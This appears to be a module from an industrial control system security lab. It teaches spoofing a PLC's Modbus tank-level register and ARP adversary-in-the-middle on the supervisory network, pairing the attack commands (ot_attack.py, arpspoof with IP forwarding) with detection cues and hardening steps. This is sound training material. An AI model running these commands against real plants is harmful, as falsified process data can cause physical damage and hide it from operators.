# 05 — Spoofed telemetry & adversary-in-the-middle

**Objective:** Make the PLC (and operator) believe the tank level is something it isn't. The PLC acts on the lie; the HMI shows the lie. Only the physics tells the truth.

**ATT&CK for ICS:** T0856 Spoof Reporting Message · T0832 Manipulation of View · T0830 Adversary-in-the-Middle

## Part A — Register spoofing (assumed breach)

```bash
# Tell the PLC the tank is at 30 % for two minutes, every 200 ms (faster than field I/O's 1 s)
python3 ot_attack.py --target 10.N.40.10 spoof-level 300 --seconds 120
```
The PLC sees "low", keeps the pump on; the real tank climbs. The HMI trend becomes a sawtooth of truth and lies.

**What you should see:** 9000001 (FC6 from Kali), `otlab-0001`, and — the key lesson — `logs-ot_process-*` diverging from what Zeek's `modbus_detailed.log` shows the HMI reading. Build a Lens chart with both series.

## Part B — ARP AitM on the supervisory LAN (advanced)

Requires an attacker on VLAN 30. Add a temporary VM to your range config:
```yaml
  - vm_name: "{{ range_id }}-rogue"
    hostname: "{{ range_id }}-rogue"
    template: kali-x64-desktop-template
    vlan: 30
    ip_last_octet: 66
    ram_gb: 4
    cpus: 2
    linux: true
```
`ludus range deploy --limit <id>-rogue`, then `sudo ot-span.sh apply` on the host so the new VM is mirrored. Remove the VM when you're done. From the rogue box:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 10.N.30.10 10.N.30.254 &     # HMI thinks we're the gateway
sudo arpspoof -i eth0 -t 10.N.30.254 10.N.30.10 &     # gateway thinks we're the HMI
# now sniff the HMI<->PLC session in Wireshark, then experiment with ettercap filters
```
Inter-VLAN filtering still applies (the router only allows HMI→PLC:502), so this tests *L2* trust inside a zone.

**What you should see:** Wireshark `arp.duplicate-address-detected`; Zeek `weird.log`; Modbus writes that carry the HMI's IP but the rogue's MAC. Rule `otlab-0009` fires if the rogue injects writes: wire writes from the HMI IP with no HMI audit entry.

## Respond & harden
- Static ARP entries for the gateway on HMI/PLC, or (real world) DAI/port security on the switch.
- Discuss: why does Modbus/TCP make this trivial? What does Modbus/TCP Security (TLS, port 802) change?

## Journal prompts
- An operator says "the HMI said everything was fine." How do you prove otherwise with only this lab's data?
- Which data source would you most hate to lose in this scenario?
